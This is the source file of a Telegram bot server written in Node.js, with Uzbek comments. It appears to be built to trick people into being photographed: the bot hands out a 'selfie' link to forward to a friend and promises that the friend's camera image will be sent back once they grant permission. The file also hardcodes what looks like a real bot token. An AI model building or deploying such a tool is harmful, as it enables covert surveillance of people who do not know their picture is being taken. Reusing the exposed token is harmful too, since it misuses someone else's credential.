import express from "express";
import TelegramBot from "node-telegram-bot-api";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Bot token
const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
const BASE_URL = "https://korish.onrender.com"; // Render'dagi sayt noming

// Webhook bilan botni sozlaymiz
const bot = new TelegramBot(TOKEN);
bot.setWebHook(`${BASE_URL}/bot${TOKEN}`);

// Tugmalar
const buttons = {
  reply_markup: {
    keyboard: [[{ text: "📸 Rasm olish" }, { text: "🆘 Yordam" }]],
    resize_keyboard: true,
  },
};

// Webhook endpoint — Telegram shu yo‘ldan xabar yuboradi
app.use(express.json());
app.post(`/bot${TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// Foydalanuvchi /start bosganda
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    `Salom ${msg.from.first_name}! Botga xush kelibsiz!\n\nRasm olish uchun pastdagi tugmadan foydalaning.`,
    buttons
  );
});

// Rasm olish tugmasi
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === "📸 Rasm olish") {
    const url = `${BASE_URL}/selfie/${chatId}`;
    bot.sendMessage(
      chatId,
      `📷 Rasm olish uchun quyidagi havolani bosing:\n\n${url}`
    );
  }
  if (text === "🆘 Yordam") {
    bot.sendMessage(
      chatId,
      "Shunchaki 📸 Rasm olish tugmasni bosing berilgan linki dostingizga jonating. Agar dostinggiz linga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'gri yo'lda foydalaning."
    );
    bot.sendAudio(chatId, fs.createReadStream("music/koryapman.mp3"));
  }
});

// Selfie sahifa
app.get("/selfie/:id", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
});
